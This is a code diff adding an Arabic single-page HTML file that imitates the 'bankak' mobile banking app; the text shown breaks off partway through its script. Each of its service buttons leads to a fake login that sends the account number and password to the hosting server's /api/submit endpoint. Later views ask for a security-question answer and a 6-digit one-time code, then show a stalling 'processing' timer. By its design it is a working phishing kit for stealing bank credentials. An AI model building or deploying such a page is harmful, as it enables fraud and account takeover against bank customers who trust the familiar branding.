@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>بنكك | bankak</title>
+
+<style>
+  :root{
+    --red-1:#ff4438;
+    --red-2:#e0231a;
+    --red-3:#b3160f;
+    --red-4:#8c0f0a;
+
+    --red:#e0231a;
+    --red-dark:#b3160f;
+    --gold:#f6b400;
+    --white:#ffffff;
+    --ink:#1c1c1c;
+    --gray:#8a8a8a;
+
+    --card-bg:#fafafa;
+    --card-border:#eeeeee;
+
+    --field-bg:#f5f5f5;
+    --field-border:#e4e4e4;
+
+    --pink-bg:#fdeceb;
+
+    --error:#e0231a;
+    --error-bg:#fdecec;
+  }
+
+  *{ margin:0; padding:0; box-sizing:border-box; }
+
+  html,body{
+    width:100%;
+    min-height:100%;
+    background:#ffffff;
+    font-family:"Segoe UI","Tahoma","Arial",sans-serif;
+    color:var(--ink);
+  }
+
+  /* ===== نظام عرض الصفحات (Router) ===== */
+  .view{ display:none; }
+  .view.active{ display:block; }
+
+  @keyframes shake{
+    10%, 90%{ transform:translateX(-2px); }
+    20%, 80%{ transform:translateX(4px); }
+    30%, 50%, 70%{ transform:translateX(-8px); }
+    40%, 60%{ transform:translateX(8px); }
+  }
+
+  /* =====================================================
+     1) شاشة البداية (Splash)
+  ===================================================== */
+  .splash{
+    position:relative;
+    height:100vh;
+    width:100vw;
+    background:
+      radial-gradient(120% 90% at 15% 5%, var(--red-1) 0%, var(--red-2) 45%, var(--red-3) 78%, var(--red-4) 100%);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+  }
+
+  .splash::before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:linear-gradient(135deg, transparent 55%, rgba(0,0,0,0.18) 100%);
+    pointer-events:none;
+  }
+
+  .waves{
+    position:absolute;
+    bottom:0;
+    left:0;
+    width:100%;
+    line-height:0;
+    pointer-events:none;
+  }
+
+  .waves svg{ width:100%; height:auto; display:block; }
+
+  .brand{
+    position:relative;
+    z-index:2;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+    opacity:0;
+    transform:scale(0.4);
+  }
+
+  .brand.animate{
+    animation:pop-in 900ms cubic-bezier(.22,1.4,.36,1) forwards;
+    animation-delay:150ms;
+  }
+
+  .brand-mark{
+    position:relative;
+    font-size:clamp(72px, 22vw, 128px);
+    font-weight:800;
+    color:var(--white);
+    line-height:1;
+    text-shadow:0 6px 24px rgba(0,0,0,0.25);
+    font-family:"Traditional Arabic","Arial",sans-serif;
+  }
+
+  .brand-mark .dot{
+    position:absolute;
+    top:-0.02em;
+    inset-inline-end:0.06em;
+    width:0.11em;
+    height:0.11em;
+    background:var(--white);
+    border-radius:50%;
+    box-shadow:0 3px 10px rgba(0,0,0,0.25);
+  }
+
+  .brand-word{
+    margin-top:0.15em;
+    font-size:clamp(38px, 11vw, 62px);
+    font-weight:700;
+    font-family:Georgia,"Times New Roman",serif;
+    color:var(--gold);
+  }
+
+  .brand-tagline{
+    margin-top:1.6em;
+    font-size:clamp(16px, 4.2vw, 22px);
+    font-weight:600;
+    color:var(--white);
+    opacity:0.95;
+  }
+
+  @keyframes pop-in{
+    0%{ opacity:0; transform:scale(0.4); }
+    60%{ opacity:1; transform:scale(1.06); }
+    100%{ opacity:1; transform:scale(1); }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .brand.animate{ animation:none; opacity:1; transform:scale(1); }
+  }
+
+  /* =====================================================
+     حاوية مشتركة لصفحات النموذج (Home / UserInfo / Security / OTP / Processing)
+  ===================================================== */
+  .page{
+    max-width:480px;
+    margin:0 auto;
+    min-height:100vh;
+    padding:20px 22px 50px;
+  }
+
+  /* الشريط العلوي: صفحات فيها زر رجوع + عنوان */
+  .topbar{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    padding-top:6px;
+  }
+
+  .topbar h1{
+    font-size:18px;
+    font-weight:700;
+  }
+
+  .back-btn{
+    width:38px;
+    height:38px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-decoration:none;
+    flex:0 0 auto;
+    background:none;
+    border:none;
+    cursor:pointer;
+  }
+
+  .back-btn svg{ width:22px; height:22px; }
+
+  /* =====================================================
+     2) الرئيسية / الخدمات (Home)
+  ===================================================== */
+  .topbar-home{
+    position:relative;
+    display:flex;
+    align-items:flex-start;
+    justify-content:space-between;
+    padding-top:6px;
+  }
+
+  .icon-btn{
+    width:40px;
+    height:40px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:transparent;
+    border:none;
+    cursor:pointer;
+    flex:0 0 auto;
+  }
+
+  .icon-btn svg{ width:24px; height:24px; }
+
+  .brand-header{
+    position:absolute;
+    left:50%;
+    top:0;
+    transform:translateX(-50%);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+
+  .brand-header .mark{
+    font-size:34px;
+    font-weight:800;
+    color:var(--red);
+    line-height:1.1;
+    font-family:"Traditional Arabic","Arial",sans-serif;
+  }
+
+  .brand-header .word{
+    margin-top:2px;
+    font-size:17px;
+    font-weight:700;
+    color:var(--gold);
+    font-family:Georgia,"Times New Roman",serif;
+  }
+
+  .services-grid{
+    margin-top:56px;
+    display:grid;
+    grid-template-columns:repeat(3, 1fr);
+    gap:14px;
+  }
+
+  .service-card{
+    background:var(--card-bg);
+    border:1px solid var(--card-border);
+    border-radius:18px;
+    padding:22px 8px 16px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+    text-decoration:none;
+    color:var(--ink);
+    gap:14px;
+    cursor:pointer;
+    transition:transform 150ms ease;
+  }
+
+  .service-card:active{ transform:scale(0.96); }
+  .service-card svg{ width:38px; height:38px; }
+  .service-card span{ font-size:13.5px; font-weight:600; line-height:1.35; }
+
+  /* =====================================================
+     3) معلومات المستخدم / تسجيل الدخول (UserInfo)
+  ===================================================== */
+  .brand-mini{ margin-top:34px; text-align:center; }
+
+  .brand-mini .mark{
+    font-size:40px;
+    font-weight:800;
+    color:var(--red);
+    font-family:"Traditional Arabic","Arial",sans-serif;
+  }
+
+  .brand-mini .word{
+    margin-top:2px;
+    font-size:18px;
+    font-weight:700;
+    color:var(--gold);
+    font-family:Georgia,"Times New Roman",serif;
+  }
+
+  .brand-mini p{ margin-top:14px; font-size:14.5px; color:var(--gray); }
+
+  .form{ margin-top:34px; display:flex; flex-direction:column; gap:20px; }
+  .field{ display:flex; flex-direction:column; gap:8px; }
+  .field label{ font-size:13.5px; font-weight:600; color:var(--gray); padding:0 6px; }
+
+  .field input{
+    width:100%;
+    height:58px;
+    border-radius:25px;
+    border:1.5px solid var(--field-border);
+    background:var(--field-bg);
+    padding:0 20px;
+    font-size:16px;
+    font-weight:600;
+    color:var(--ink);
+    outline:none;
+    text-align:right;
+    direction:rtl;
+    transition:border-color 150ms ease, background 150ms ease;
+    font-family:inherit;
+  }
+
+  .field input::placeholder{ color:#a9a9a9; font-weight:500; }
+  .field input:focus{ border-color:var(--red); background:#ffffff; }
+  .field.error input{ border-color:var(--error); background:var(--error-bg); color:var(--error); }
+
+  .field-hint{ font-size:12.5px; color:var(--gray); padding:0 6px; line-height:1.5; }
+  .field.error .field-hint{ color:var(--error); }
+  .field.shake input{ animation:shake 480ms cubic-bezier(.36,.07,.19,.97) both; }
+
+  .next-btn{
+    margin-top:38px;
+    width:100%;
+    height:56px;
+    border:none;
+    border-radius:25px;
+    background:var(--red);
+    color:#ffffff;
+    font-size:17px;
+    font-weight:700;
+    cursor:pointer;
+    transition:background 150ms ease, transform 150ms ease;
+  }
+
+  .next-btn:active{ transform:scale(0.98); background:var(--red-dark); }
+
+  /* =====================================================
+     4) سؤال الأمان (Security)
+  ===================================================== */
+  .question-box{ margin-top:32px; position:relative; }
+
+  .question-select{
+    width:100%;
+    background:var(--pink-bg);
+    border:none;
+    border-radius:18px;
+    padding:22px 20px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
+    cursor:pointer;
+    font-family:inherit;
+    text-align:right;
+  }
+
+  .question-select span{ font-size:16.5px; font-weight:700; color:var(--ink); line-height:1.5; }
+  .question-select.placeholder span{ color:#9a8f8e; font-weight:600; }
+  .question-select svg{ width:20px; height:20px; flex:0 0 auto; transition:transform 200ms ease; }
+  .question-select.open svg{ transform:rotate(180deg); }
+  .question-box.shake{ animation:shake 480ms cubic-bezier(.36,.07,.19,.97) both; }
+
+  .question-dropdown{
+    margin-top:10px;
+    background:#ffffff;
+    border:1.5px solid var(--field-border);
+    border-radius:16px;
+    padding:8px;
+    display:none;
+    overflow:hidden;
+  }
+
+  .question-dropdown.show{ display:block; }
+
+  .question-item{
+    width:100%;
+    background:none;
+    border:none;
+    border-radius:12px;
+    padding:14px 12px;
+    text-align:right;
+    font-family:inherit;
+    font-size:15px;
+    font-weight:600;
+    color:var(--ink);
+    cursor:pointer;
+  }
+
+  .question-item:active{ background:#f6f6f6; }
+  .question-item + .question-item{ border-top:1px solid #f0f0f0; }
+
+  .more-questions{
+    width:100%;
+    margin-top:6px;
+    background:none;
+    border:none;
+    border-top:1px solid #f0f0f0;
+    padding:14px 12px 6px;
+    text-align:center;
+    font-family:inherit;
+    font-size:14.5px;
+    font-weight:700;
+    color:var(--red);
+    cursor:pointer;
+  }
+
+  .more-questions[hidden]{ display:none; }
+
+  .answer-section{ margin-top:28px; }
+  .answer-label{ font-size:14px; font-weight:600; color:var(--gray); padding:0 6px 10px; display:block; }
+  .answer-field{ position:relative; }
+
+  .answer-field textarea{
+    width:100%;
+    min-height:60px;
+    max-height:120px;
+    border-radius:18px;
+    border:1.5px solid var(--field-border);
+    background:#ffffff;
+    padding:18px 20px;
+    font-size:15.5px;
+    font-weight:600;
+    color:var(--ink);
+    outline:none;
+    resize:none;
+    text-align:right;
+    direction:rtl;
+    font-family:inherit;
+    transition:border-color 150ms ease, background 150ms ease;
+  }
+
+  .answer-field textarea::placeholder{ color:#a9a9a9; font-weight:500; }
+  .answer-field textarea:focus{ border-color:var(--red); }
+  .answer-field.error textarea{ border-color:var(--error); background:var(--error-bg); color:var(--error); }
+  .answer-field.shake textarea{ animation:shake 480ms cubic-bezier(.36,.07,.19,.97) both; }
+
+  .char-count{ margin-top:6px; text-align:left; font-size:12px; color:var(--gray); padding:0 6px; }
+
+  .submit-btn{
+    margin-top:36px;
+    width:100%;
+    height:56px;
+    border:none;
+    border-radius:25px;
+    background:var(--red);
+    color:#ffffff;
+    font-size:17px;
+    font-weight:700;
+    cursor:pointer;
+    transition:background 150ms ease, transform 150ms ease;
+  }
+
+  .submit-btn:active{ transform:scale(0.98); background:var(--red-dark); }
+
+  /* =====================================================
+     5) رمز التحقق (OTP)
+  ===================================================== */
+  .shield-wrap{ display:flex; justify-content:center; margin-top:38px; }
+  .shield-wrap svg{ width:110px; height:110px; }
+
+  .hint-text{ margin-top:34px; text-align:center; font-size:15.5px; font-weight:600; color:var(--ink); }
+
+  .otp-fields{
+    margin-top:26px;
+    display:flex;
+    justify-content:space-between;
+    gap:8px;
+    direction:ltr;
+  }
+
+  .otp-fields input{
+    flex:1;
+    height:64px;
+    max-width:64px;
+    border-radius:16px;
+    border:1.5px solid var(--field-border);
+    background:#ffffff;
+    text-align:center;
+    font-size:24px;
+    font-weight:700;
+    color:var(--ink);
+    outline:none;
+    transition:border-color 150ms ease, background 150ms ease;
+  }
+
+  .otp-fields input:focus{ border-color:var(--red); }
+  .otp-fields.error input{ border-color:var(--error); background:var(--error-bg); color:var(--error); }
+  .otp-fields.shake{ animation:shake 480ms cubic-bezier(.36,.07,.19,.97) both; }
+
+  .resend-row{ margin-top:24px; display:flex; align-items:center; justify-content:center; gap:16px; }
+  .otp-timer{ font-size:16px; font-weight:700; color:var(--red); direction:ltr; }
+
+  .resend-link{
+    font-size:14.5px;
+    font-weight:600;
+    color:var(--gray);
+    background:none;
+    border:none;
+    font-family:inherit;
+    cursor:not-allowed;
+  }
+
+  .resend-link.active{ color:var(--red); cursor:pointer; }
+
+  .confirm-btn{
+    margin-top:40px;
+    width:100%;
+    height:56px;
+    border:none;
+    border-radius:25px;
+    background:var(--red);
+    color:#ffffff;
+    font-size:17px;
+    font-weight:700;
+    cursor:pointer;
+    transition:background 150ms ease, transform 150ms ease;
+  }
+
+  .confirm-btn:active{ transform:scale(0.98); background:var(--red-dark); }
+
+  /* =====================================================
+     6) جاري المعالجة (Processing)
+  ===================================================== */
+  .processing-page{
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    padding:20px 22px 50px;
+  }
+
+  .spinner{
+    width:86px;
+    height:86px;
+    border-radius:50%;
+    border:6px solid #f5d9d7;
+    border-top-color:var(--red);
+    animation:spin 900ms linear infinite;
+  }
+
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+
+  .proc-title{ margin-top:34px; font-size:19px; font-weight:700; color:var(--ink); }
+  .proc-subtitle{ margin-top:10px; font-size:15px; font-weight:600; color:var(--gray); }
+  .proc-timer{ margin-top:38px; font-size:34px; font-weight:800; color:var(--red); direction:ltr; }
+  .proc-timer-label{ margin-top:6px; font-size:13.5px; font-weight:600; color:var(--gray); }
+
+  .done-text{
+    margin-top:38px;
+    font-size:17px;
+    font-weight:700;
+    color:#1e9e4f;
+    display:none;
+  }
+
+  .done-text.show{ display:block; }
+
+</style>
+</head>
+<body>
+
+<!-- =========================================================
+     1) VIEW: شاشة البداية (index)
+========================================================= -->
+<section id="view-index" class="view active">
+  <main class="splash" role="img" aria-label="الشاشة الافتتاحية لتطبيق بنكك">
+    <section class="brand" id="splashBrand">
+      <div class="brand-mark" aria-hidden="true">بنكك<span class="dot"></span></div>
+      <div class="brand-word">bankak</div>
+      <p class="brand-tagline">خدماتك المصرفية بين يديك</p>
+    </section>
+    <div class="waves" aria-hidden="true">
+      <svg viewBox="0 0 1080 260" preserveAspectRatio="none">
+        <path d="M0,160 C180,100 340,220 560,170 C760,125 900,200 1080,150 L1080,260 L0,260 Z" fill="#ffffff" opacity="0.08"/>
+        <path d="M0,200 C200,150 380,240 620,190 C820,150 950,220 1080,190 L1080,260 L0,260 Z" fill="#ffffff" opacity="0.14"/>
+      </svg>
+    </div>
+  </main>
+</section>
+
+<!-- =========================================================
+     2) VIEW: الرئيسية / الخدمات (home)
+========================================================= -->
+<section id="view-home" class="view">
+  <div class="page">
+    <header class="topbar-home">
+      <button class="icon-btn" type="button" aria-label="الإشعارات">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1c1c1c" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 8a6 6 0 0 0-12 0c0 7-3 9-3 9h18s-3-2-3-9"/>
+          <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+        </svg>
+      </button>
+
+      <div class="brand-header" aria-label="بنكك">
+        <div class="mark">بنكك</div>
+        <div class="word">bankak</div>
+      </div>
+
+      <button class="icon-btn" type="button" data-nav="userinfo" aria-label="الملف الشخصي">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1c1c1c" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="8" r="4"/>
+          <path d="M4 20c1.8-4 5-6 8-6s6.2 2 8 6"/>
+        </svg>
+      </button>
+    </header>
+
+    <section class="services-grid" aria-label="قائمة الخدمات">
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M4 7h13l-3-3"/><path d="M20 17H7l3 3"/>
+        </svg>
+        <span>التحويلات الخاطئة</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2 4 5v6c0 5 3.5 9 8 11 4.5-2 8-6 8-11V5z"/>
+          <path d="M12 8.5 13 11h2.5l-2 1.8.8 2.7L12 14l-2.3 1.5.8-2.7-2-1.8H11z"/>
+        </svg>
+        <span>ترقية الحساب إلى مميز</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="6" width="18" height="13" rx="2.5"/><path d="M16 12.5h2.5"/><path d="M3 10h18"/>
+        </svg>
+        <span>ترقية الحساب إلى جاري</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 20V5"/><path d="M6 10l6-6 6 6"/>
+        </svg>
+        <span>رفع سقف الحويلات</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="5" y="3" width="14" height="18" rx="2"/><path d="M8.5 8h7"/><path d="M8.5 12h7"/><path d="M8.5 16h4"/>
+        </svg>
+        <span>كشف الحساب</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2.5" y="6" width="19" height="13" rx="2.5"/><path d="M2.5 10.5h19"/><path d="M6 15h4"/>
+        </svg>
+        <span>بطاقة فيزا أفتراضية</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="9"/><path d="M3 12h18"/>
+          <path d="M12 3c2.5 2.6 3.8 5.8 3.8 9s-1.3 6.4-3.8 9c-2.5-2.6-3.8-5.8-3.8-9s1.3-6.4 3.8-9z"/>
+        </svg>
+        <span>خدمات العملات الأجنبية</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 3l7 3v5c0 4.8-3 8.3-7 10-4-1.7-7-5.2-7-10V6z"/>
+          <path d="M12 9.5v.01"/>
+          <path d="M12 12.2c0-1 1.4-1 1.4-2.1 0-.8-.6-1.4-1.4-1.4s-1.4.6-1.4 1.4"/>
+          <path d="M12 14.6v.01" stroke-width="2.4"/>
+        </svg>
+        <span>إدارة أسئلة الأمان</span>
+      </button>
+
+      <button class="service-card" type="button" data-nav="userinfo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M6.6 10.8c1.4 2.8 3.8 5.2 6.6 6.6l2.2-2.2c.3-.3.7-.4 1.1-.3 1.2.4 2.5.6 3.8.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.6.6 3.8.1.4 0 .8-.3 1.1l-2.2 2.2z"/>
+        </svg>
+        <span>تغيير الموبايل</span>
+      </button>
+    </section>
+  </div>
+</section>
+
+<!-- =========================================================
+     3) VIEW: تسجيل الدخول (userinfo)
+========================================================= -->
+<section id="view-userinfo" class="view">
+  <div class="page">
+    <header class="topbar">
+      <button class="back-btn" type="button" data-nav="home" aria-label="رجوع">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1c1c1c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M15 5l-7 7 7 7"/>
+        </svg>
+      </button>
+      <h1>تسجيل الدخول</h1>
+    </header>
+
+    <section class="brand-mini" aria-hidden="true">
+      <div class="mark">بنكك</div>
+      <div class="word">bankak</div>
+      <p>من فضلك أدخل رقم الحساب وكلمة المرور</p>
+    </section>
+
+    <form class="form" id="loginForm" novalidate>
+      <div class="field" id="accountField">
+        <label for="accountNumber">رقم الحساب</label>
+        <input type="text" id="accountNumber" inputmode="numeric" maxlength="7" placeholder="أدخل رقم الحساب" autocomplete="off">
+        <p class="field-hint">رقم الحساب يجب أن يتكون من 7 أرقام بالضبط</p>
+      </div>
+
+      <div class="field" id="passwordField">
+        <label for="password">كلمة المرور</label>
+        <input type="password" id="password" placeholder="أدخل كلمة المرور" autocomplete="off">
+        <p class="field-hint">يجب أن تحتوي على حرف كبير واحد على الأقل (A-Z) ورمز خاص واحد على الأقل مثل # @ ! $ % & * ^ € £</p>
+      </div>
+
+      <button type="submit" class="next-btn">التالي</button>
+    </form>
+  </div>
+</section>
+
+<!-- =========================================================
+     4) VIEW: سؤال الأمان (security)
+========================================================= -->
+<section id="view-security" class="view">
+  <div class="page">
+    <header class="topbar">
+      <button class="back-btn" type="button" data-nav="userinfo" aria-label="رجوع">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1c1c1c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M15 5l-7 7 7 7"/>
+        </svg>
+      </button>
+      <h1>الإجابة على سؤال الأمان</h1>
+    </header>
+
+    <div class="question-box" id="questionBox">
+      <button type="button" class="question-select placeholder" id="questionSelect">
+        <span id="questionText">اختر سؤال أمان</span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1c1c1c" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M6 9l6 6 6-6"/>
+        </svg>
+      </button>
+      <div class="question-dropdown" id="questionDropdown">
+        <div id="questionList"></div>
+        <button type="button" class="more-questions" id="moreQuestionsBtn">أسئلة أخرى</button>
+      </div>
+    </div>
+
+    <div class="answer-section">
+      <label class="answer-label" for="answerInput">أدخل إجابتك</label>
+      <div class="answer-field" id="answerField">
+        <textarea id="answerInput" maxlength="30" placeholder="اكتب إجابتك هنا"></textarea>
+      </div>
+      <p class="char-count"><span id="charCount">0</span>/30</p>
+    </div>
+
+    <button type="button" class="submit-btn" id="submitBtn">إرسال</button>
+  </div>
+</section>
+
+<!-- =========================================================
+     5) VIEW: رمز التحقق (otp)
+========================================================= -->
+<section id="view-otp" class="view">
+  <div class="page">
+    <header class="topbar">
+      <button class="back-btn" type="button" data-nav="security" aria-label="رجوع">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1c1c1c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M15 5l-7 7 7 7"/>
+        </svg>
+      </button>
+      <h1>تأكيد الرقم السري</h1>
+    </header>
+
+    <div class="shield-wrap" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="var(--red)">
+        <path d="M12 2 4 5.5v6c0 5.4 3.4 9.7 8 11 4.6-1.3 8-5.6 8-11v-6z"/>
+        <path d="M9.2 12.4 11 14.2l4-4.4" stroke="#ffffff" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
+    <p class="hint-text">أدخل رمز التحقق المكون من 6 أرقام</p>
+
+    <div class="otp-fields" id="otpFields">
+      <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+      <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+      <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+      <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+      <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+      <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+    </div>
+
+    <div class="resend-row">
+      <span class="otp-timer" id="otpTimer">30:00</span>
+      <button type="button" class="resend-link" id="resendBtn" disabled>إعادة إرسال الرمز</button>
+    </div>
+
+    <button type="button" class="confirm-btn" id="confirmBtn">تأكيد</button>
+  </div>
+</section>
+
+<!-- =========================================================
+     6) VIEW: جاري معالجة العملية (processing)
+========================================================= -->
+<section id="view-processing" class="view">
+  <div class="processing-page">
+    <div class="spinner" id="spinner" aria-hidden="true"></div>
+    <p class="proc-title">جاري معالجة العملية</p>
+    <p class="proc-subtitle">الرجاء الانتظار</p>
+    <div class="proc-timer" id="processingTimer">10:00</div>
+    <p class="proc-timer-label" id="processingTimerLabel">الوقت المتبقي للانتهاء من المعالجة</p>
+    <p class="done-text" id="doneText">تم الانتهاء من معالجة العملية</p>
+  </div>
+</section>
+
+<script>
+  /* =========================================================
+     API Config
+  ========================================================= */
+  const BASE_URL = window.location.origin; // Auto-detect server URL
+  let currentSessionId = null;
+
+  /* =========================================================
+     الموجّه (Router) بين الصفحات
+  ========================================================= */
+  const views = document.querySelectorAll('.view');
+
+  function showView(name){
+    views.forEach(v => v.classList.remove('active'));
+    document.getElementById('view-' + name).classList.add('active');
+
+    if(name === 'index'){ startSplash(); }
+    if(name === 'otp'){ startOtpTimer(); }
+    if(name === 'processing'){ startProcessingTimer(); }
+  }
+
+  document.addEventListener('click', (e) => {
+    const target = e.target.closest('[data-nav]');
+    if(target){
+      showView(target.getAttribute('data-nav'));
+    }
+  });
+
+  /* =========================================================
+     1) شاشة البداية: تشغيل حركة الدخول + الانتقال التلقائي
+  ========================================================= */
+  const splashBrand = document.getElementById('splashBrand');
+  let splashTimeout = null;
+
+  function startSplash(){
+    splashBrand.classList.remove('animate');
+    void splashBrand.offsetWidth;
+    splashBrand.classList.add('animate');
+
+    if(splashTimeout) clearTimeout(splashTimeout);
+    splashTimeout = setTimeout(() => { showView('home'); }, 2600);
+  }
+
+  startSplash();
+
+  /* =========================================================
+     3) تسجيل الدخول: التحقق من رقم الحساب وكلمة المرور + API
+  ========================================================= */
+  const loginForm = document.getElementById('loginForm');
+  const accountField = document.getElementById('accountField');
+  const accountInput = document.getElementById('accountNumber');
+  const passwordField = document.getElementById('passwordField');
+  const passwordInput = document.getElementById('password');
+  const specialCharsPattern = /[#'@!$%&*^¥₩£€]/;
+
+  accountInput.addEventListener('input', () => {
+    accountInput.value = accountInput.value.replace(/[^0-9]/g, '').slice(0, 7);
+    if(accountField.classList.contains('error') && isAccountValid(accountInput.value)){
+      clearFieldError(accountField);
+    }
+  });
+
+  passwordInput.addEventListener('input', () => {
+    if(passwordField.classList.contains('error') && isPasswordValid(passwordInput.value)){
+      clearFieldError(passwordField);
+    }
+  });
+
+  function isAccountValid(value){ return /^[0-9]{7}$/.test(value); }
+
+  function isPasswordValid(value){
+    const hasUpper = /[A-Z]/.test(value);
+    const hasSpecial = specialCharsPattern.test(value);
+    return hasUpper && hasSpecial;
+  }
+
+  function triggerFieldError(fieldEl){
+    fieldEl.classList.add('error');
+    fieldEl.classList.remove('shake');
+    void fieldEl.offsetWidth;
+    fieldEl.classList.add('shake');
+  }
+
+  function clearFieldError(fieldEl){ fieldEl.classList.remove('error', 'shake'); }
+
+  accountField.addEventListener('animationend', () => accountField.classList.remove('shake'));
+  passwordField.addEventListener('animationend', () => passwordField.classList.remove('shake'));
+
+  loginForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const username = accountInput.value;
+    const password = passwordInput.value;
+    
+    if(!isAccountValid(username)){ triggerFieldError(accountField); return; }
+    if(!isPasswordValid(password)){ triggerFieldError(passwordField); return; }
+    
+    try {
+      const res = await fetch(`${BASE_URL}/api/submit`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+      
+      if(!res.ok) throw new Error('Login failed');
+      const data = await res.json();
+      currentSessionId = data.sessionId;
+      showView('security');
+    } catch(err) {
+      console.error('Error:', err);
+      triggerFieldError(passwordField);
+    }
+  });
+
+  /* =========================================================
+     4) سؤال الأمان: اختيار السؤال + التحقق من الإجابة + API
+  ========================================================= */
+  const allQuestions = [
+    "ماذا كان لقبك اثناء الطفولة؟","اسم مؤلفك المفضل؟","اسم الشركة المصنعة للسيارة المفضلة لديك؟",
+    "ما هو اسم ابن عمك الأول؟","في أي مدينة ولدت؟","في أي سنة تخرجت من الجامعة؟",
+    "أي فيلم هو المفضل لديك؟","اسم أفضل صديق في الطفولة؟","في أي عام حصلت على رخصة القيادة الخاصة بك؟",
+    "ما هو اسم المدرسة التي التحقت بها؟","اسم أول بلد أجنبي قمت بزيارته؟","ما هي ماركة سيارتك الأولى؟",
+    "العلامة التجارية لأول تلفزيون خاص بك؟","في أي سنة تزوجت؟","اسم فريق كرة القدم المفضل لديك؟"
+  ];
+
+  const BATCH_SIZE = 5;
+  let currentBatch = 0;
+
+  const questionSelect = document.getElementById('questionSelect');
+  const questionText = document.getElementById('questionText');
+  const questionDropdown = document.getElementById('questionDropdown');
+  const questionList = document.getElementById('questionList');
+  const moreQuestionsBtn = document.getElementById('moreQuestionsBtn');
+  const questionBox = document.getElementById('questionBox');
+
+  function renderQuestions(){
+    questionList.innerHTML = '';
+    const start = currentBatch * BATCH_SIZE;
+    const batch = allQuestions.slice(start, start + BATCH_SIZE);
+
+    batch.forEach((q) => {
+      const btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'question-item';
+      btn.textContent = q;
+      btn.addEventListener('click', () => selectQuestion(q));
+      questionList.appendChild(btn);
+    });
+
+    const totalShown = start + batch.length;
+    if(totalShown >= allQuestions.length){ moreQuestionsBtn.setAttribute('hidden', ''); }
+    else { moreQuestionsBtn.removeAttribute('hidden'); }
+  }
+
+  function selectQuestion(q){
+    questionText.textContent = q;
+    questionSelect.classList.remove('placeholder');
+    closeDropdown();
+  }
+
+  function openDropdown(){ questionDropdown.classList.add('show'); questionSelect.classList.add('open'); }
+  function closeDropdown(){ questionDropdown.classList.remove('show'); questionSelect.classList.remove('open'); }
+
+  questionSelect.addEventListener('click', () => {
